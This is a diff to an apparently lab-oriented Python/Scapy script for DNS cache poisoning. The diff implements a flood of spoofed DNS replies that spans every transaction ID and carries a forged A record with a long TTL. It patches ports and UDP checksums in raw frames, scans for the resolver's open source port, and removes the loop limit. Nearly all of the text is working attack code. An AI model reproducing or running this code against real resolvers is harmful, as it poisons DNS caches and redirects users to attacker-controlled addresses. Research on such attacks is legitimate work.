@@ -21,13 +21,16 @@ sleep_time_for_ICMP_refresh = .05 # 50 ms
 wait_time_for_ICMP_reply = .05
 
 MIN_PORT_TO_SCAN = 50000
-MAX_PORT_TO_SCAN = 50500
+MAX_PORT_TO_SCAN = 50600
 
 fixed_src_port_for_attack = 9556
 
 finished = 0
 
-timeout_for_dns_query = 20
+timeout_for_dns_query = 600
+
+raw_dns_replies = None
+pseudo_hdr = None
 
 global_socket = conf.L2socket(iface='vboxnet2')
 
@@ -85,7 +88,7 @@ def initialize():
         local_free_ip.append(local_ip_base + str(now))
         now += 1
     #print (local_free_ip)
-    print (len(local_free_ip))
+    #print (len(local_free_ip))
 
 class Logger(object):
     def __init__(self):
@@ -115,6 +118,7 @@ def step1(thread_id, lock):
     lock.acquire()
     
     ret = sr1(packet, timeout=timeout_for_dns_query, verbose=True)
+    print (ret.show())
 
     lock.release()
 
@@ -227,8 +231,62 @@ def find_the_exact_port(start_port, number_of_ports):
         print ("no open port found in bin search : " + str(ret))
     return ret
 
+def patch(dns_frame: bytearray, pseudo_hdr: bytes, dport: int):
+    """Adjust the DNS port and patch the UDP checksum within the given Ethernet frame"""
+
+    # set destination port
+    dns_frame[36] = (dport >> 8) & 0xFF
+    dns_frame[37] = dport & 0xFF
+
+    # reset checksum
+    dns_frame[40] = 0x00
+    dns_frame[41] = 0x00
+
+    # calc new checksum
+    ck = checksum(pseudo_hdr + dns_frame[34:])
+    if ck == 0:
+        ck = 0xFFFF
+    cs = struct.pack("!H", ck)
+    dns_frame[40] = cs[0]
+    dns_frame[41] = cs[1]
+    return dns_frame
+
+def prepare_dns_replies(port):
+    dns_replies = []
+    for txid in range(1024, 65536):
+        
+        dns_replies.append(
+            Ether()
+            / IP(dst=forwarder_ip, src=resolver_ip)
+            / UDP(sport=53, dport=0)
+            / DNS(id=txid, qr=1, qdcount=1, ancount=1, aa=1,
+                    qd=DNSQR(qname=domain_name, qtype=0x0001, qclass=0x0001), # type A, class IN
+                    an=DNSRR(rrname=domain_name, ttl=70000, rdata="123.123.123.123"))
+        )
+
+    raw_dns_replies = []
+    for dns_reply in dns_replies:
+        raw_dns_replies.append(bytearray(raw(dns_reply)))
+    pseudo_hdr = struct.pack(
+        "!4s4sHH",
+        inet_pton(socket.AF_INET, dns_replies[0]["IP"].src),
+        inet_pton(socket.AF_INET, dns_replies[0]["IP"].dst),
+        socket.IPPROTO_UDP,
+        len(raw_dns_replies[0][34:]),
+    )
+    return (raw_dns_replies, pseudo_hdr)
+
 def flood_the_port_with_spoofed_dns_response(actual_port):
-    None
+    global raw_dns_replies, pseudo_hdr
+    
+    start_time = time.perf_counter()
+    for reply in raw_dns_replies:
+        patch(reply, pseudo_hdr, actual_port)
+        global_socket.send(reply)
+    end_time = time.perf_counter()
+    elapsed_time = end_time - start_time
+    print ("time needed to sent all: " + to_milis_str(elapsed_time))
+    return True
 
 def step2(thread_id, source_port_range_start, source_port_range_end, lock):
     #need to run this file with sudo because of port 53
@@ -278,10 +336,19 @@ def main():
     initialize()
 
     sys.stdout = Logger()
+
+    start_time = time.perf_counter()
+    print ('preparing spoofed replies.')
+    global raw_dns_replies, pseudo_hdr
+    raw_dns_replies, pseudo_hdr = prepare_dns_replies(port)
+    print('spoofed replies prepared.')
+    end_time = time.perf_counter()
+    elapsed_time = end_time - start_time
+    print ("Time needed to prepare all spoofed replies: " + str(elapsed_time))
     
     iteration = 1
 
-    while finished == 0 and iteration < 3:
+    while finished == 0:
 
         time.sleep(2)
 
